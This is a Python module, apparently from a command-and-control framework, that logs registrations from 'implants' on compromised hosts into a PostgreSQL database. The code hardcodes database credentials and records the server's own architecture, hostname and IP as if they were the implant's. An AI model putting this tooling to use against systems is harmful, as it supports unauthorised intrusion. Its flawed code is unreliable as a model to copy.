# Handle registrations from new implants
import threading
import sys
import os
import socket
from queue import Queue
from pb import implantpb_pb2

# Import db objects
from sqlalchemy import create_engine, engine, insert
from sqlalchemy.orm import Session
db_module_path = os.getcwd() + '/../db'
sys.path.insert(0, db_module_path) # Necessary to import schema file
from schema import Implants

class Handler:
    def __init__(self, requestq: Queue):
        self._requestq = requestq

    def start(self):
        t = threading.Thread(target=self._handle_registrations, args=())
        t.start()

    # Handle incoming registrations
    def _handle_registrations(self):
        # Get items from the queue
        while True:
            data, addr = self._requestq.get()
            self.readRegistration(data, addr)

    def readRegistration(self, data: bytes, addr):
        # Get implant info - used by line 49
        implant_arch = os.uname().machine
        implant_host = socket.gethostname()
        implant_ip = socket.gethostbyname(implant_host)

        # Parse the incoming data
        message = implantpb_pb2.Message()
        message.ParseFromString(data)
        if message.message_type == implantpb_pb2.Message.MessageType.Registration:
            registration = implantpb_pb2.Registration()
            registration.ParseFromString(message.data)
            if len(registration.addr) < 1:
                registration.addr = str(addr)

            # Connect to SQLAlchemy engine
            engine = create_engine('postgresql+psycopg2://postgres:password@localhost:5432/test_db')
            session = Session(engine)
            implant = Implants(OS = registration.os, Arch = implant_arch, IPv4 = implant_ip, Hostname = implant_host, \
                               Username = registration.user.name, PID = registration.pid)
            session.add(implant)
            session.commit()
            session.close()

            #pid = 12345
            #formatted_pid = "{:05d}".format(pid)  # pads with zeros to a width of 5
            #print(formatted_pid)  # outputs "12345"

            # TODO: Log this part here instead of printing to stdout
            display = f"""
            Accepted new connection:
                addr: {registration.addr},
                os: {registration.os},
                pid: {registration.pid},
                user: {registration.user.name},
                groups: {registration.groups}"""
            print(display)